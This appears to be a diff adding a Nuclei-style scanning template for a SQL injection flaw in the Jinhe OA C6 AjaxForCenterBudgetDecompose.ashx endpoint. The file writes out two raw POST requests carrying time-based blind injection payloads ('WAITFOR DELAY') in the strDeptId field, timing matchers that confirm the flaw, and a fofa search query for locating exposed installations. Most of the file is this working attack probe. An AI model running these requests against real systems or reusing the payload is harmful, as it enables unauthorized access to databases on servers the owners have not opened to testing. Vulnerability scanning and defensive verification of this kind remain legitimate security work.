@@ -1,0 +1,29 @@
+id: jinhe-oa-c6-ajaxforcenterbudgetdecompose-sqli
+info:
+  name: 金和OA C6 AjaxForCenterBudgetDecompose.ashx组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+      金和OA C6系统中AjaxForCenterBudgetDecompose.ashx处理模块存在SQL注入缺陷，攻击者可通过构造恶意参数在数据库层执行任意SQL命令，实现敏感数据提取或权限操控。该漏洞影响路径为/C6/AjaxForCenterBudgetDecompose.ashx接口，建议通过fofa语法定位目标：app="金和网络-金和OA"，检测时间窗口截至2025-12-29。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCenterBudgetDecompose.ashx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    strType=getDectomposeDepartment&strDeptId=20121;;WAITFOR DELAY '0:0:5'--
+  - |
+    POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCenterBudgetDecompose.ashx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    strType=getDectomposeDepartment&strDeptId=20121;;WAITFOR DELAY '0:0:8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
